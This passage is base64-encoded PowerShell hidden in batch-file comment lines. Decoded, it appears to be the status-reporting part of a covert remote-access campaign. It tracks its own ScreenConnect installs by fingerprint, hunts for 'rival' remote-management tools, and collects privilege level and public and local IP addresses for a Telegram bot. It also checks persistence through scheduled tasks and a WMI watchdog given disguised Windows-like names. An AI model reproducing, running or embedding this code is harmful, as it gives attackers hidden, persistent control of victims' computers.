::eXxSdW5uaW5nJykgLW9yICgkc3RhdHVzIC1lcSAncHJlc2VudCcpKQ0KICAgIHJl
::dHVybiBAew0KICAgICAgICBQcmVzZW50ID0gJHRydWUNCiAgICAgICAgT3VycyAg
::ICA9IFtib29sXSRvdXJzDQogICAgICAgIEhlYWx0aHkgPSBbYm9vbF0kaGVhbHRo
::eQ0KICAgICAgICBTdGF0dXMgID0gJChpZiAoJG91cnMpIHsgJHN0YXR1cyB9IGVs
::c2UgeyAnTk9UX09VUlMnIH0pDQogICAgICAgIE5leHQgICAgPSAkbmV4dA0KICAg
::ICAgICBMYXN0ICAgID0gJGxhc3QNCiAgICAgICAgUmVzdWx0ICA9ICRyZXN1bHQN
::CiAgICAgICAgVHIgICAgICA9ICQoaWYgKCR0cikgeyAkdHIgfSBlbHNlIHsgJycg
::fSkNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEdldC1SbW1IaXRzIHsNCiAgICAjIERl
::dGVjdCByaXZhbHMgZm9yIFRlbGVncmFtLiBLRUVQOiBTY3JlZW5Db25uZWN0IGFs
::bG93bGlzdCArIERhdHRvL0NlbnRyYVN0YWdlLg0KICAgICR0b2tlbnMgPSBAKA0K
::ICAgICAgICAnQW55RGVzaycsICdUZWFtVmlld2VyJywgJ3R2bnNlcnZlcicsICdE
::V0FnZW50JywgJ0RXU2VydmljZScsICdMb2dNZUluJywgJ0xNSUd1YXJkaWFuJywN
::CiAgICAgICAgJ1dpblZOQycsICd2bmNzZXJ2ZXInLCAndHZfJywgJ1NwbGFzaHRv
::cCcsICdab2hvIEFzc2lzdCcsICdSdXN0RGVzaycsICdSZW1vdGVQQycsICdEYW1l
::V2FyZScsDQogICAgICAgICdBdGVyYUFnZW50JywgJ0F0ZXJhJywgJ05pbmphUk1N
::JywgJ05pbmphT25lJywgJ05pbmphUk1NQWdlbnQnLCAnS2FzZXlhJywgJ0FnZW50
::TW9uJywgJ1B1bHNld2F5JywgJ1BDIE1vbml0b3InLCAnU3luY3JvJywgJ0thYnV0
::bycsDQogICAgICAgICdTdXBlck9wcycsICdNYW5hZ2VFbmdpbmUnLCAnVUVNUycs
::ICdEZXNrdG9wIENlbnRyYWwnLCAnRW5kcG9pbnQgQ2VudHJhbCcsICdTb2xhcldp
::bmRzIE1TUCcsICdDb25uZWN0V2lzZSBBdXRvbWF0ZScsICdMVFNlcnZpY2UnLCAn
::TGFiVGVjaCcsDQogICAgICAgICdBY3Rpb24xJywgJ1NpbXBsZUhlbHAnLCAnQm9t
::Z2FyJywgJ0JleW9uZFRydXN0JywgJ01lc2hBZ2VudCcsICdNZXNoIENlbnRyYWwn
::LCAnTWVzaCBBZ2VudCcsDQogICAgICAgICdUYWN0aWNhbFJNTScsICd0YWN0aWNh
::bHJtbScsICdHZXRTY3JlZW4nLCAnU3VwcmVtbycsICdydXRzZXJ2JywgJ3JlbW90
::aW5nX2hvc3QnLA0KICAgICAgICAnQ2hyb21lIFJlbW90ZSBEZXNrdG9wJywgJ1Bh
::cnNlYycsICdOZXRTdXBwb3J0JywgJ0xldmVsLmlvJywgJ0xldmVsIEFnZW50JywN
::CiAgICAgICAgJ0NvbnRpbnV1bScsICdTQUFaJywgJ05hdmVyaXNrJywgJ0ltbXlC
::b3QnLCAnQXV0b21veCcsICdhbWFnZW50JywgJ0Fjcm9uaXMgQ3liZXInLCAnRG9t
::b3R6JywgJ0F1dmlrJywNCiAgICAgICAgJ0JhcnJhY3VkYSBSTU0nLCAnTWFuYWdl
::ZCBXb3JrcGxhY2UnLCAnR292ZXJsYW4nLCAnUERRIERlcGxveScsICdQRFEgSW52
::ZW50b3J5JywgJ1BEUSBDb25uZWN0JywNCiAgICAgICAgJ04tYWJsZScsICdOLWNl
::bnRyYWwnLCAnTi1zaWdodCcsICdUYWtlIENvbnRyb2wnLCAnQWR2YW5jZWQgTW9u
::aXRvcmluZyBBZ2VudCcsICdVbHRyYVZpZXdlcicsICdBZXJvQWRtaW4nLA0KICAg
::ICAgICAnTGl0ZU1hbmFnZXInLCAnUmFkbWluJywgJ05vTWFjaGluZScsICdJcGVy
::aXVzJywgJ0lTTCBMaWdodCcsICdBbW15eScsICdUaWdodFZOQycsICdVbHRyYVZO
::QycsICdSZWFsVk5DJw0KICAgICkNCiAgICAka2VlcFRva2VucyA9IEAoJ0RhdHRv
::JywgJ0NlbnRyYVN0YWdlJywgJ0NhZ1NlcnZpY2UnLCAnQXV0b3Rhc2tFbmRwb2lu
::dCcpDQogICAgJGhpdHMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5H
::ZW5lcmljLkxpc3Rbc3RyaW5nXQ0KICAgICRzZWVuID0gQHt9DQoNCiAgICBmdW5j
::dGlvbiBBZGQtSGl0KFtzdHJpbmddJGtpbmQsIFtzdHJpbmddJG5hbWUpIHsNCiAg
::ICAgICAgJGtleSA9ICIka2luZHwkbmFtZSIuVG9Mb3dlckludmFyaWFudCgpDQog
::ICAgICAgIGlmICgkc2Vlbi5Db250YWluc0tleSgka2V5KSkgeyByZXR1cm4gfQ0K
::ICAgICAgICAkc2Vlblska2V5XSA9ICR0cnVlDQogICAgICAgIFt2b2lkXSRoaXRz
::LkFkZCgoJy0gW3swfV0gPGNvZGU+ezF9PC9jb2RlPicgLWYgJGtpbmQsIChFc2Mg
::JG5hbWUpKSkNCiAgICB9DQogICAgZnVuY3Rpb24gVGVzdC1LZWVwTmFtZShbc3Ry
::aW5nXSRzKSB7DQogICAgICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAkZmFsc2Ug
::fQ0KICAgICAgICBpZiAoJHMgLWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0
::dXJuICR0cnVlIH0NCiAgICAgICAgZm9yZWFjaCAoJGsgaW4gJGtlZXBUb2tlbnMp
::IHsgaWYgKCRzIC1saWtlICIqJGsqIikgeyByZXR1cm4gJHRydWUgfSB9DQogICAg
::ICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQoNCiAgICBHZXQtU2VydmljZSAtRXJy
::b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAg
::ICAgICAgJG4gPSAkXy5OYW1lDQogICAgICAgICRkID0gJF8uRGlzcGxheU5hbWUN
::CiAgICAgICAgaWYgKFRlc3QtS2VlcE5hbWUgJG4gLW9yIFRlc3QtS2VlcE5hbWUg
::JGQpIHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAnKkNlbnRyYVN0YWdlKicg
::LW9yICRkIC1saWtlICcqRGF0dG8qJyAtb3IgJG4gLWxpa2UgJypDYWdTZXJ2aWNl
::KicpIHsNCiAgICAgICAgICAgICAgICBBZGQtSGl0ICdrZWVwLWRhdHRvJyAoIiRu
::ICgkKCRfLlN0YXR1cykpIikNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJl
::dHVybg0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMp
::IHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIgLW9yICRkIC1saWtl
::ICIqJHQqIikgew0KICAgICAgICAgICAgICAgIEFkZC1IaXQgJ3N2YycgKCIkbiAo
::JCgkXy5TdGF0dXMpKSIpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAg
::ICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIEdldC1Qcm9jZXNzIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAg
::ICAgICAkbiA9ICRfLlByb2Nlc3NOYW1lDQogICAgICAgIGlmIChUZXN0LUtlZXBO
::YW1lICRuKSB7IHJldHVybiB9DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tl
::bnMpIHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIpIHsNCiAgICAg
::ICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbg0KICAgICAgICAgICAgICAgIGJy
::ZWFrDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkdW5p
::bnN0ID0gQCgNCiAgICAgICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5k
::b3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwqJywNCiAgICAgICAgJ0hLTE06
::XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRW
::ZXJzaW9uXFVuaW5zdGFsbFwqJw0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0aCBp
::biAkdW5pbnN0KSB7DQogICAgICAgIEdldC1JdGVtUHJvcGVydHkgJHBhdGggLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQog
::ICAgICAgICAgICAkZG4gPSAkXy5EaXNwbGF5TmFtZQ0KICAgICAgICAgICAgaWYg
::KC1ub3QgJGRuKSB7IHJldHVybiB9DQogICAgICAgICAgICBpZiAoVGVzdC1LZWVw
::TmFtZSAkZG4pIHsNCiAgICAgICAgICAgICAgICBpZiAoJGRuIC1saWtlICcqRGF0
::dG8qJyAtb3IgJGRuIC1saWtlICcqQ2VudHJhU3RhZ2UqJykgeyBBZGQtSGl0ICdr
::ZWVwLWRhdHRvJyAkZG4gfQ0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAg
::ICAgICAgfQ0KICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAnU2NyZWVuQ29ubmVj
::dConKSB7IHJldHVybiB9DQogICAgICAgICAgICBmb3JlYWNoICgkdCBpbiAkdG9r
::ZW5zKSB7DQogICAgICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAiKiR0KiIpIHsN
::CiAgICAgICAgICAgICAgICAgICAgQWRkLUhpdCAnbXNpJyAkZG4NCiAgICAgICAg
::ICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAg
::ICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICByZXR1cm4gJGhpdHMNCn0NCg0K
::ZnVuY3Rpb24gR2V0LUdyeXhhS2VlcEZwIHsNCiAgICAkZnAgPSAnOTkwODE5OGU2
::NjhlNDc1MCcNCiAgICAkcCA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2lu
::ZG93c1xXRVJcVGVtcFwud3VjYWNoZVxncnl4YS5jZmcnDQogICAgaWYgKCRXb3Jr
::RGlyKSB7ICRwID0gSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YS5jZmcnIH0NCiAg
::ICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkcCkgew0KICAgICAgICBHZXQt
::Q29udGVudCAtTGl0ZXJhbFBhdGggJHAgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBpZiAoJF8gLW1h
::dGNoICdeQ1VSUkVOVF9GUD0oWzAtOWEtZkEtRl17MTZ9KVxzKiQnKSB7ICRmcCA9
::ICRtYXRjaGVzWzFdLlRvTG93ZXIoKSB9DQogICAgICAgIH0NCiAgICB9DQogICAg
::cmV0dXJuICRmcA0KfQ0KDQpmdW5jdGlvbiBHZXQtU2NJbnN0YWxscyB7DQogICAg
::JGdyeXhhRnAgPSBHZXQtR3J5eGFLZWVwRnANCiAgICAkbGlzdCA9IE5ldy1PYmpl
::Y3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAg
::R2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBXaGVy
::ZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3JlZW5Db25uZWN0IENsaWVudCon
::IH0gfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICRmcCA9IGlmICgkXy5OYW1l
::IC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9KVwpJykgeyAkbWF0Y2hlc1sxXSB9IGVs
::c2UgeyAnPycgfQ0KICAgICAgICAkdGFnID0gaWYgKCRmcCAtZXEgJzVmNjAxMDU3
::OTg1MmU1MDcnKSB7ICdLRUVQLVNFVlJaJyB9DQogICAgICAgIGVsc2VpZiAoJGZw
::IC1lcSAnZjg2MWM4MTQwZDQ1MzQyNycpIHsgJ0tFRVAtQUxUJyB9DQogICAgICAg
::IGVsc2VpZiAoJGZwIC1lcSAkZ3J5eGFGcCkgeyAnS0VFUC1HUllYQScgfQ0KICAg
::ICAgICBlbHNlIHsgJ0ZPUkVJR04nIH0NCiAgICAgICAgW3ZvaWRdJGxpc3QuQWRk
::KCgnLSA8Y29kZT57MH08L2NvZGU+OiA8Yj57MX08L2I+IFt7Mn1dJyAtZiAoRXNj
::ICRfLk5hbWUpLCAoRXNjIChbc3RyaW5nXSRfLlN0YXR1cykpLCAkdGFnKSkNCiAg
::ICB9DQoNCiAgICAkcm9vdHMgPSBAKA0KICAgICAgICAiJHtlbnY6UHJvZ3JhbUZp
::bGVzfVxTY3JlZW5Db25uZWN0IENsaWVudCoiLA0KICAgICAgICAiJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiINCiAgICApDQog
::ICAgZm9yZWFjaCAoJHBhdCBpbiAkcm9vdHMpIHsNCiAgICAgICAgR2V0LUNoaWxk
::SXRlbSAtUGF0aCAkcGF0IC1EaXJlY3RvcnkgLUVycm9yQWN0aW9uIFNpbGVudGx5
::Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBbdm9pZF0k
::bGlzdC5BZGQoKCctIHBhdGg6IDxjb2RlPnswfTwvY29kZT4nIC1mIChFc2MgJF8u
::RnVsbE5hbWUpKSkNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICR1bmluc3QgPSBA
::KA0KICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3Vy
::cmVudFZlcnNpb25cVW5pbnN0YWxsXConLA0KICAgICAgICAnSEtMTTpcU09GVFdB
::UkVcV09XNjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25c
::VW5pbnN0YWxsXConDQogICAgKQ0KICAgIGZvcmVhY2ggKCRwYXRoIGluICR1bmlu
::c3QpIHsNCiAgICAgICAgR2V0LUl0ZW1Qcm9wZXJ0eSAkcGF0aCAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7DQogICAgICAgICAg
::ICAkXy5EaXNwbGF5TmFtZSAtbGlrZSAnKlNjcmVlbkNvbm5lY3QqJw0KICAgICAg
::ICB9IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgJHZlciA9IGlmICgk
::Xy5EaXNwbGF5VmVyc2lvbikgeyAkXy5EaXNwbGF5VmVyc2lvbiB9IGVsc2UgeyAn
::PycgfQ0KICAgICAgICAgICAgW3ZvaWRdJGxpc3QuQWRkKCgnLSBtc2k6IDxjb2Rl
::PnswfTwvY29kZT4gdnsxfScgLWYgKEVzYyAkXy5EaXNwbGF5TmFtZSksIChFc2Mg
::JHZlcikpKQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgaWYgKCRsaXN0LkNvdW50
::IC1lcSAwKSB7IFt2b2lkXSRsaXN0LkFkZCgnLSAobm9uZSknKSB9DQogICAgcmV0
::dXJuICRsaXN0DQp9DQoNCiRjZmcgPSBHZXQtQ2ZnDQppZiAoLW5vdCAkY2ZnLkJP
::VF9UT0tFTiAtb3IgLW5vdCAkY2ZnLkNIQVRfSUQpIHsNCiAgICBBZGQtQ29udGVu
::dCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInKSAt
::VmFsdWUgJ3RnX3NraXBfbm9fY2ZnJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
::aW51ZQ0KICAgIGV4aXQgMg0KfQ0KDQokcHJpbSA9ICdTY3JlZW5Db25uZWN0IENs
::aWVudCAoNWY2MDEwNTc5ODUyZTUwNyknDQokYWx0ID0gJ1NjcmVlbkNvbm5lY3Qg
::Q2xpZW50IChmODYxYzgxNDBkNDUzNDI3KScNCiRvcyA9IEdldC1Pc0luZm8NCiR3
::aG8gPSBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1
::cnJlbnQoKS5OYW1lDQokZWxldiA9IChbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRv
::d3NQcmluY2lwYWxdW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHld
::OjpHZXRDdXJyZW50KCkpLklzSW5Sb2xlKA0KICAgIFtTZWN1cml0eS5QcmluY2lw
::YWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikNCiRpc1N5c3Rl
::bSA9ICR3aG8gLWxpa2UgJypTWVNURU0qJyAtb3IgJHdobyAtZXEgJ05UIEFVVEhP
::UklUWVxTWVNURU0nDQoNCiRtc2lDYWNoZSA9IEpvaW4tUGF0aCAkV29ya0RpciAn
::cGtnLm1zaScNCiRtc2lTaXplID0gaWYgKFRlc3QtUGF0aCAkbXNpQ2FjaGUpIHsN
::CiAgICAnezA6TjB9IEtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNoZSAtRm9yY2Up
::Lkxlbmd0aCAvIDFLQikNCn0gZWxzZSB7ICdub25lJyB9DQoNCiRtb25QYXRoID0g
::Sm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcNCiRldGxNb24gPSAiJGVu
::djpQcm9ncmFtRGF0YVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNo
::ZVxldGxfbW9uLmNtZCINCiRoYXNNb24gPSBUZXN0LVBhdGggJG1vblBhdGgNCiRo
::YXNFdGwgPSBUZXN0LVBhdGggJGV0bE1vbg0KDQojIFQxMDogb24tZGlzayBwYXls
::b2FkIGJ1aWxkIG1hcmtlcnMgLT4gZXZlcnkgcmVwb3J0IHByb3ZlcyBleGFjdGx5
::IHdoYXQgaXMgaW5zdGFsbGVkDQpmdW5jdGlvbiBHZXQtUGF5bG9hZEJ1aWxkKFtz
::dHJpbmddJGZpbGUpIHsNCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRmaWxlKSkg
::eyByZXR1cm4gJ21pc3NpbmcnIH0NCiAgICBmb3JlYWNoICgkbCBpbiAoR2V0LUNv
::bnRlbnQgLUxpdGVyYWxQYXRoICRmaWxlIC1Ub3RhbENvdW50IDggLUZvcmNlIC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgew0KICAgICAgICBpZiAoJGwg
::LW1hdGNoICdCVUlMRFxzK1xkezh9KFtBLVpdK1xkKyknKSB7IHJldHVybiAkbWF0
::Y2hlc1sxXSB9DQogICAgfQ0KICAgIHJldHVybiAnPycNCn0NCiRiTW9uID0gR2V0
::LVBheWxvYWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcp
::DQokYlNlYyA9IEdldC1QYXlsb2FkQnVpbGQgKEpvaW4tUGF0aCAkV29ya0RpciAn
::b3duX3NlY3VyZS5jbWQnKQ0KJGJUZ3IgPSBHZXQtUGF5bG9hZEJ1aWxkIChKb2lu
::LVBhdGggJFdvcmtEaXIgJ3RnX3JlcG9ydC5wczEnKQ0KJGJMaWIgPSBHZXQtUGF5
::bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ293bl9saWIucHMxJykNCg0K
::IyBwZXItaG9zdCBpZGVudGl0eTogZXhwZWN0ZWQgdGFzayBuYW1lcyBjb21lIGZy
::b20gaWRlbnRpdHkuY2ZnIHdoZW4gcHJlc2VudA0KJGlkQ2ZnID0gSm9pbi1QYXRo
::ICRXb3JrRGlyICdpZGVudGl0eS5jZmcnDQokaWRNYXAgPSBAe30NCmlmIChUZXN0
::LVBhdGggJGlkQ2ZnKSB7DQogICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRp
::ZENmZyB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgaWYgKCRfIC1tYXRjaCAn
::XlxzKihbQS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7ICRpZE1hcFskbWF0Y2hl
::c1sxXV0gPSAkbWF0Y2hlc1syXSB9DQogICAgfQ0KfQ0KJGV4cGVjdGVkVGFza3Mg
::PSBAKA0KICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19BKSB7ICRpZE1h
::cC5UQVNLX0EgfSBlbHNlIHsgJ1dlclF1ZXVlU3luYycgfSk7IFJvbGUgPSAidGlj
::ayAkKCRpZE1hcC5NT19BKW0gKGNoYWluMSkiIH0sDQogICAgQHsgTmFtZSA9ICQo
::aWYgKCRpZE1hcC5UQVNLX0IpIHsgJGlkTWFwLlRBU0tfQiB9IGVsc2UgeyAnUGxh
::U2VydmVySGVhbHRoJyB9KTsgUm9sZSA9ICJiYWNrdXAgJCgkaWRNYXAuTU9fQilt
::IChjaGFpbjEpIiB9LA0KICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19D
::KSB7ICRpZE1hcC5UQVNLX0MgfSBlbHNlIHsgJ1dkaUhvc3RQcm94eScgfSk7IFJv
::bGUgPSAnT05TVEFSVCAoY2hhaW4xKScgfSwNCiAgICBAeyBOYW1lID0gJChpZiAo
::JGlkTWFwLlRBU0tfRCkgeyAkaWRNYXAuVEFTS19EIH0gZWxzZSB7ICdUY3BJcENv
::bmZsaWN0UmVzJyB9KTsgUm9sZSA9ICdPTkxPR09OIChjaGFpbjEpJyB9DQopDQoj
::IGNoYWluIDI6IFdNSSB3YXRjaGRvZyBzdWJzY3JpcHRpb24NCiR3bWlDID0gR2V0
::LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBD
::b21tYW5kTGluZUV2ZW50Q29uc3VtZXIgLUZpbHRlciAiTmFtZT0nV3VjYWNoZVdh
::dGNoZG9nQyciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQokZXhwZWN0
::ZWRUYXNrcyArPSBAeyBOYW1lID0gJ1xXTUlcV3VjYWNoZVdhdGNoZG9nQyc7IFJv
::bGUgPSAndGltZXIgM20gKGNoYWluMiknOyBXbWkgPSAoJG51bGwgLW5lICR3bWlD
::KSB9DQoNCiR0YXNrTGluZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9u
::cy5HZW5lcmljLkxpc3Rbc3RyaW5nXQ0KJHRhc2tPayA9IDANCiR0YXNrQmFkID0g
::MA0KZm9yZWFjaCAoJHQgaW4gJGV4cGVjdGVkVGFza3MpIHsNCiAgICBpZiAoJHQu
::Q29udGFpbnNLZXkoJ1dtaScpKSB7DQogICAgICAgIGlmICgkdC5XbWkpIHsgJHRh
::c2tPaysrOyAkbWFyayA9ICdPSycgfSBlbHNlIHsgJHRhc2tCYWQrKzsgJG1hcmsg
::PSAnTUlTU0lORycgfQ0KICAgICAgICBbdm9pZF0kdGFza0xpbmVzLkFkZCgoJy0g
::W3swfV0gPGNvZGU+ezF9PC9jb2RlPiAtIHsyfScgLWYgJG1hcmssIChFc2MgJHQu
::TmFtZSksIChFc2MgJHQuUm9sZSkpKQ0KICAgICAgICBjb250aW51ZQ0KICAgIH0N
::CiAgICAkaCA9IEdldC1UYXNrSGVhbHRoICR0Lk5hbWUNCiAgICBpZiAoJGguUHJl
::c2VudCAtYW5kICRoLkhlYWx0aHkpIHsNCiAgICAgICAgJHRhc2tPaysrDQogICAg
::ICAgICRtYXJrID0gJ09LJw0KICAgIH0gZWxzZWlmICgkaC5QcmVzZW50IC1hbmQg
::LW5vdCAkaC5PdXJzKSB7DQogICAgICAgICR0YXNrQmFkKysNCiAgICAgICAgJG1h
::cmsgPSAnTk9UX09VUlMnDQogICAgfSBlbHNlaWYgKCRoLlByZXNlbnQpIHsNCiAg
::ICAgICAgJHRhc2tCYWQrKw0KICAgICAgICAkbWFyayA9ICdXRUFLJw0KICAgIH0g
::ZWxzZSB7DQogICAgICAgICR0YXNrQmFkKysNCiAgICAgICAgJG1hcmsgPSAnTUlT
::U0lORycNCiAgICB9DQogICAgJGV4dHJhID0gJycNCiAgICBpZiAoJGguUHJlc2Vu
::dCkgew0KICAgICAgICAkYml0cyA9IEAoKQ0KICAgICAgICBpZiAoJGguU3RhdHVz
::KSB7ICRiaXRzICs9ICRoLlN0YXR1cyB9DQogICAgICAgIGlmICgkaC5SZXN1bHQg
::LW5lICcnIC1hbmQgJGguUmVzdWx0IC1uZSAnMCcpIHsgJGJpdHMgKz0gKCJMYXN0
::UmVzdWx0PSIgKyAkaC5SZXN1bHQpIH0NCiAgICAgICAgaWYgKCRiaXRzLkNvdW50
::KSB7ICRleHRyYSA9ICcgKCcgKyAoJGJpdHMgLWpvaW4gJywgJykgKyAnKScgfQ0K
::ICAgIH0NCiAgICBbdm9pZF0kdGFza0xpbmVzLkFkZCgoJy0gW3swfV0gPGNvZGU+
::ezF9PC9jb2RlPiAtIHsyfXszfScgLWYgJG1hcmssIChFc2MgJHQuTmFtZSksIChF
::c2MgJHQuUm9sZSksIChFc2MgJGV4dHJhKSkpDQp9DQoNCiRwcmltTGluZSA9IEdl
::dC1TdmNMaW5lICRwcmltDQokYWx0TGluZSA9IEdldC1TdmNMaW5lICRhbHQNCiRw
::cmltT2sgPSAkcHJpbUxpbmUgLWxpa2UgJ1J1bm5pbmcqJw0KJGRlcGxveU9rID0g
::JHByaW1PayAtYW5kICgkdGFza09rIC1nZSAzKSAtYW5kICRoYXNNb24NCg0KJGVt
::b2ppTWFwID0gQHsNCiAgICBPSyAgICAgICA9IFtzdHJpbmddKFtjaGFyXTB4Mjcw
::NSkNCiAgICBET1dOICAgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21V
::dGYzMigweDFGNkE4KSkNCiAgICBSRVNUT1JFRCA9IChbc3RyaW5nXVtjaGFyXTo6
::Q29udmVydEZyb21VdGYzMigweDFGN0UyKSkNCiAgICBGQUlMICAgICA9IFtzdHJp
::bmddKFtjaGFyXTB4Mjc0QykNCiAgICBGT1JDRSAgICA9IFtzdHJpbmddKFtjaGFy
::XTB4MjZBMSkNCiAgICBERVBMT1kgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVy
::dEZyb21VdGYzMigweDFGNjgwKSkNCiAgICBIQiAgICAgICA9IChbc3RyaW5nXVtj
::aGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNEUxKSkNCn0NCiRrZXkgPSAkU3Rh
::dGUuVG9VcHBlckludmFyaWFudCgpDQokZW1vamkgPSBpZiAoJGVtb2ppTWFwLkNv
::bnRhaW5zS2V5KCRrZXkpKSB7ICRlbW9qaU1hcFska2V5XSB9IGVsc2UgeyAoW3N0
::cmluZ11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjRGMSkpIH0NCg0KJHRp
::dGxlID0gc3dpdGNoICgka2V5KSB7DQogICAgJ09LJyB7ICdQcmltYXJ5IGhlYWx0
::aHknIH0NCiAgICAnRE9XTicgeyAnUHJpbWFyeSBET1dOIC0gaGVhbGluZycgfQ0K
::ICAgICdSRVNUT1JFRCcgeyAnUHJpbWFyeSBSRVNUT1JFRCcgfQ0KICAgICdGQUlM
::JyB7ICdIZWFsIEZBSUxFRCcgfQ0KICAgICdGT1JDRScgeyAnRm9yY2VkIHJlaW5z
::dGFsbCcgfQ0KICAgICdERVBMT1knIHsgaWYgKCRkZXBsb3lPaykgeyAnRklSU1Qg
::REVQTE9ZIE9LJyB9IGVsc2UgeyAnRklSU1QgREVQTE9ZIC0gQ0hFQ0sgTkVFREVE
::JyB9IH0NCiAgICAnSEInIHsgJ2hvdXJseSBkaWdlc3QnIH0NCiAgICBkZWZhdWx0
::IHsgIlN0YXRlOiAkU3RhdGUiIH0NCn0NCg0KJHRyYW5zID0gaWYgKCRPbGRTdGF0
::ZSkgeyAiJE9sZFN0YXRlIC0+ICRTdGF0ZSIgfSBlbHNlIHsgJFN0YXRlIH0NCiRz
::Y0xpc3QgPSBHZXQtU2NJbnN0YWxscw0KJHJtbUhpdHMgPSBHZXQtUm1tSGl0cw0K
::aWYgKCRybW1IaXRzLkNvdW50IC1lcSAwKSB7IFt2b2lkXSRybW1IaXRzLkFkZCgn
::LSAobm9uZSBkZXRlY3RlZCknKSB9DQoNCiRwdWIgPSBHZXQtUHVibGljSXANCiRs
::YW4gPSBHZXQtTG9jYWxJcHMNCiRub3cgPSBHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5
::LU1NLWRkIEhIOm1tOnNzIHp6eicNCiR1cHRpbWUgPSAnbi9hJw0KdHJ5IHsNCiAg
::ICAkYm9vdCA9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5nU3lzdGVt
::KS5MYXN0Qm9vdFVwVGltZQ0KICAgICR1cHRpbWUgPSAnezA6ZGR9ZCB7MDpoaH1o
::IHswOm1tfW0nIC1mICgoR2V0LURhdGUpIC0gJGJvb3QpDQp9IGNhdGNoIHt9DQoN
::CiMgY2FtcGFpZ24gc3RhdGUgZmlsZSAod3JpdHRlbiBieSBvd25fbGliLnBzMSBz
